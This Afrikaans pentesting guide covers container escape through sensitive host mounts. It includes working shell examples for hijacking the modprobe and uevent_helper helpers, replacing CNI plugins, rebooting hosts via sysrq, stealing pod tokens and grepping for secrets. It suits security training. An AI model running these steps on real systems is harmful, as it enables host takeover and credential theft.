# Sensitiewe Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host-mounts is een van die belangrikste praktiese container-escape-aanvalsoppervlakke omdat hulle dikwels ’n noukeurig geïsoleerde proses-aansig terug laat val na direkte sigbaarheid van host-hulpbronne. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind-mounts van `/proc`, `/sys`, `/var`, runtime-sockets, kubelet-beheerde toestand, of device-verwante paaie kan kernel-kontroles, credentials, lêerstelsels van naburige containers en runtime-bestuurskoppelvlakke blootstel.

Hierdie bladsy bestaan afsonderlik van die individuele beskermingsbladsye omdat die misbruikmodel dwarsdeur verskeie areas strek. ’n Skryfbare host-mount is deels gevaarlik weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-dekking, en deels weens presies watter host-pad blootgestel is. Deur dit as ’n eie onderwerp te behandel, word die aanvalsoppervlak baie makliker om te ontleed.

## `/proc`-blootstelling

procfs bevat sowel gewone proses-inligting as kernel-kontrole-koppelvlakke met ’n groot impak. ’n Bind-mount soos `-v /proc:/host/proc`, of ’n container-aansig wat onverwags skryfbare proc-inskrywings blootstel, kan dus lei tot inligtingsopenbaring, denial of service, of direkte code execution op die host.

Belangrike procfs-paaie sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur na te gaan watter belangrike procfs-inskrywings sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paaie is om verskillende redes interessant. `core_pattern`, `modprobe` en `binfmt_misc` kan host code-execution-paaie word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore` en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` onthul proses-, cgroup- en filesystem-konteks wat kan help om die host-uitleg van binne die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om hulle almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
Indien skryfbaar, is dit een van die paaie met die grootste impak in procfs, omdat die kernel ’n pipe-handler ná ’n crash sal uitvoer. ’n Container wat `core_pattern` kan wys na ’n payload wat in sy overlay of in ’n gemounte host-pad gestoor is, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir ’n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
Hierdie pad beheer die userspace-helper wat deur die kernel gebruik word wanneer dit module-loading-logika moet aanroep. Indien dit vanuit die container skryfbaar is en in die host-konteks geïnterpreteer word, kan dit nog ’n host code-execution primitive word. Dit is veral interessant wanneer dit gekombineer word met ’n manier om die helper-pad te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie ’n netjiese escape-primitive nie, maar dit kan memory pressure in host-wye denial of service omskep deur OOM-toestande in kernel panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
Indien die registrasie-interface skryfbaar is, kan die attacker ’n handler vir ’n gekose magic value registreer en host-context execution verkry wanneer ’n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsystems, mitigations en opsionele kernel features geaktiveer is sonder dat host package metadata benodig word.
- `/proc/sysrq-trigger`
Hoofsaaklik ’n denial-of-service-pad, maar ’n baie ernstige een. Dit kan die host onmiddellik reboot, panic of andersins ontwrig.
- `/proc/kmsg`
Onthul kernel ring buffer-boodskappe. Nuttig vir host fingerprinting, crash analysis en in sommige omgewings vir die leaking van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer dit leesbaar is, omdat dit exported kernel symbol-inligting blootstel en kan help om address randomization-aannames tydens kernel exploit development te omseil.
- `/proc/[pid]/mem`
Dit is ’n direkte process-memory-interface. Indien die target process met die nodige ptrace-style conditions bereikbaar is, kan dit die lees of wysiging van ’n ander process se memory toelaat. Die realistiese impak hang sterk af van credentials, `hidepid`, Yama en ptrace restrictions, dus is dit ’n kragtige maar conditional path.
- `/proc/kcore`
Blootstel ’n core-image-style aansig van system memory. Die lêer is enorm en omslagtig om te gebruik, maar indien dit betekenisvol leesbaar is, dui dit op ’n swak blootgestelde host memory surface.
- `/proc/kmem` en `/proc/mem`
Historiese high-impact raw memory interfaces. Op baie moderne systems is hulle disabled of sterk restricted, maar indien hulle teenwoordig en bruikbaar is, moet hulle as critical findings behandel word.
- `/proc/sched_debug`
Leek scheduling- en task-inligting wat host process identities kan blootstel, selfs wanneer ander process views skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
Uiters nuttig om te rekonstrueer waar die container werklik op die host geleë is, watter paaie overlay-backed is en of ’n skryfbare mount met host-inhoud ooreenstem of slegs met die container layer.

Indien `/proc/[pid]/mountinfo` of overlay-details leesbaar is, gebruik dit om die host-pad van die container-filesystem te herstel:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat verskeie host-execution-truuks vereis dat ’n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se perspektief.

### Volledige voorbeeld: `modprobe` Helper Path Abuse

As `/proc/sys/kernel/modprobe` vanuit die container skryfbaar is en die helper path in die host-konteks geïnterpreteer word, kan dit na ’n aanvaller-beheerde payload herlei word:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese trigger hang van die teiken en kernelgedrag af, maar die belangrike punt is dat ’n skryfbare helper path ’n toekomstige kernel helper invocation kan herlei na aanvaller-beheerde host-path-inhoud.

### Volledige voorbeeld: Kernel Recon met `kallsyms`, `kmsg` en `config.gz`

As die doel exploitability-assessment eerder as onmiddellike escape is:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie commands help om te bepaal of nuttige symbol information sigbaar is, of onlangse kernel-boodskappe interessante state openbaar, en watter kernel-features of mitigations ingebou is. Die impak is gewoonlik nie direkte escape nie, maar dit kan kernel-vulnerability triage aansienlik verkort.

### Volledige voorbeeld: SysRq Host Reboot

As `/proc/sysrq-trigger` writable is en die host view bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is ’n onmiddellike host-herlaai. Dit is nie ’n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling baie ernstiger kan wees as bloot inligtingblootlegging.

## `/sys`-blootstelling

sysfs stel groot hoeveelhede kernel- en toesteltoestand bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, security-module-konfigurasie of firmware-toestand kan beïnvloed.

Hoëwaarde-sysfs-paaie sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan thermal-management-gedrag beïnvloed en dus host-stabiliteit in swak blootgestelde omgewings beïnvloed. `/sys/kernel/vmcoreinfo` kan crash-dump- en kernel-layout-inligting lek wat met laevlak-host-fingerprinting help. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, dus kan onverwagte toegang daar MAC-verwante toestand blootstel of verander. EFI-variable-paaie kan firmware-gesteunde boot-instellings beïnvloed, wat hulle baie ernstiger as gewone konfigurasielêers maak. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit doelbewus ’n ontwikkelaar-georiënteerde koppelvlak is met baie minder veiligheidsverwagtings as geharde kernel-API’s wat vir produksie bedoel is.

Nuttige hersieningsopdragte vir hierdie paaie is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat maak daardie commands interessant:

- `/sys/kernel/security` kan onthul of AppArmor, SELinux of ’n ander LSM-surface sigbaar is op ’n manier wat slegs vir die host moes gebly het.
- `/sys/kernel/debug` is dikwels die kommerwekkendste bevinding in hierdie groep. As `debugfs` gemount is en leesbaar of skryfbaar is, verwag ’n breë kernel-facing surface waarvan die presiese risiko afhang van die geaktiveerde debug-nodes.
- EFI-variable exposure kom minder algemeen voor, maar het ’n groot impak indien dit teenwoordig is, omdat dit firmware-backed settings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir host-stabiliteit en hardware-interaksie, nie vir ’n netjiese shell-style escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n bron vir host-fingerprinting en crash analysis, nuttig om laevlak-kernel state te verstaan.

### Volledige Voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel ’n attacker-controlled helper uitvoer wanneer ’n `uevent` getrigger word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk, is dat die helper path vanuit die host se perspektief geïnterpreteer word. Sodra dit geaktiveer word, loop die helper in die host-konteks eerder as binne die huidige container.

## Blootstelling van `/var`

Die mounting van die host se `/var` in ’n container word dikwels onderskat omdat dit nie so dramaties soos die mounting van `/` lyk nie. In die praktyk kan dit genoeg wees om toegang tot runtime sockets, container snapshot directories, kubelet-managed pod volumes, geprojekteerde service-account tokens en aangrensende application filesystems te verkry. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container-state eintlik geleë is.

### Kubernetes-voorbeeld

’n Pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay snapshot-content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie commands is nuttig omdat hulle aandui of die mount slegs onbelangrike application data blootstel, of cluster credentials met ’n groot impak. ’n Leesbare service-account token kan plaaslike code execution onmiddellik in Kubernetes API access omskakel.

As die token teenwoordig is, valideer waartoe dit toegang het in plaas daarvan om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan veel groter wees as plaaslike node-toegang. ’n Token met breë RBAC kan ’n gemounte `/var` in ’n clusterwye kompromittering verander.

### Docker- en containerd-voorbeeld

Op Docker-hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-gesteunde Kubernetes-nodes onder `/var/lib/containerd` of snapshotter-spesifieke paths kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van ’n ander workload blootlê, kan die aanvaller moontlik toepassingslêers wysig, webinhoud plant of opstartskripte verander sonder om aan die huidige container-konfigurasie te raak.

Konkrete misbruikidees sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie opdragte is nuttig omdat hulle die drie hoof-impakfamilies van 'n gemounte `/var` toon: toepassingmanipulasie, secret-herwinning en laterale beweging na aangrensende workloads.

## Kubelet-status, Plugins en CNI-paaie

'n Mount van `/var/lib/kubelet`, `/opt/cni/bin` of `/etc/cni/net.d` word dikwels deur bevoorregte DaemonSets, CNI-agente, CSI-node-plugins, GPU-operateurs en storage-helpers blootgestel. Hierdie mounts word maklik as "node plumbing" afgemaak, maar hulle is direk in die uitvoeringspad vir nuwe pods en bevat dikwels kubelet-credentials, geprojekteerde secrets, registrasie-sockets en uitvoerbare plugin-binaries aan die host-kant.

Teikens met 'n hoë waarde sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige hersieningsopdragte is:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Waarom hierdie paaie belangrik is:

- `/var/lib/kubelet/pki` kan kubelet-client certificates en ander node-local credentials blootstel wat soms teen die API server of kubelet-facing TLS endpoints hergebruik kan word, afhangend van die cluster-ontwerp.
- `/var/lib/kubelet/pods` bevat dikwels projected service-account tokens en gemounte Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik 'n reconnaissance-oppervlak, maar 'n baie nuttige een: dit wys watter pods en containers tans GPUs, hugepages, SR-IOV devices en ander skaars node-local resources gebruik.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` en `/var/lib/kubelet/plugins_registry` wys watter CSI-, DRA- en device plugins geïnstalleer is, asook met watter sockets die kubelet verwag word om te kommunikeer. As daardie directories writable is eerder as net readable, word die finding baie ernstiger.
- `/opt/cni/bin` en `/etc/cni/net.d` is direk op die pod-network setup path. Writable access daar is dikwels 'n vertraagde host-execution primitive eerder as blootstelling van configuration.

### Volledige voorbeeld: Writable `/opt/cni/bin`

As 'n host CNI binary directory read-write gemount is, kan die vervanging van 'n plugin genoeg wees om host execution te verkry wanneer die kubelet die volgende keer 'n pod sandbox op daardie node skep:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur-pods. Die belangrike punt is dat die gewysigde binary later deur die host-netwerkopstellingsvloei uitgevoer word, nie deur die huidige container nie.


## Runtime-sockets

Sensitiewe host-mounts sluit dikwels runtime-sockets eerder as volledige directories in. Dit is so belangrik dat dit hier uitdruklik herhaal moet word:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets gemount is.

As ’n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een hiervan slaag, is die pad vanaf "mounted socket" tot "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout-pad.

## Writable Host Path Task Hijack

’n Writable host mount hoef nie `/` bloot te stel om gevaarlik te wees nie. As die gemounte pad scripts, config files, hooks, plugins of lêers bevat wat later deur ’n host-side scheduled task of diens gebruik word, kan die container moontlik verander wat die host uitvoer.

Generiese hersieningsvloei:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Indien ’n skryfbare lêer deur ’n host-proses verbruik word, hou die payload eenvoudig en waarneembaar tydens toetsing:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Die interessante deel is die trust boundary: die skryfaksie gebeur vanuit binne die container, maar uitvoering gebeur later in die host service-konteks. Dit verander ’n beperkte hostPath of bind mount in ’n vertraagde host-code-execution primitive.

## Mount-Verwante CVEs

Host mounts oorvleuel ook met runtime-kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n leaked directory file descriptor die working directory op die host filesystem kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652` en `CVE-2024-23653` in BuildKit, waar malicious Dockerfiles, frontends en `RUN --mount`-flows host file access, deletion of elevated privileges tydens builds kon herinstel.
- `CVE-2024-1753` in Buildah en Podman build flows, waar crafted bind mounts tydens ’n build `/` read-write kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens image unpack ’n specially crafted image kon toelaat om die host filesystem tydens pull te wysig.

Hierdie CVEs is hier belangrik omdat hulle wys dat mount handling nie net oor operator configuration gaan nie. Die runtime self kan ook mount-driven escape conditions veroorsaak.

## Kontroles

Gebruik hierdie commands om die hoogste-waarde mount exposures vinnig op te spoor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat hier interessant is:

- Host root, `/proc`, `/sys`, `/var` en runtime sockets is almal hoëprioriteit-bevindings.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die mount host-globale kernkontroles blootstel eerder as ’n veilige container-aansig.
- Gemounte `/var`-paaie verdien ’n hersiening van credentials en naburige workloads, nie net ’n lêerstelselhersiening nie.
- Kubelet-staatgidse en CNI/plugin-paaie verdien dieselfde prioriteit as runtime sockets, omdat hulle dikwels direk op die node se pod-skeppings- en credential-verspreidingspad lê.

## Verwysings

- [Plaaslike lêers en paaie wat deur die Kubelet gebruik word](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
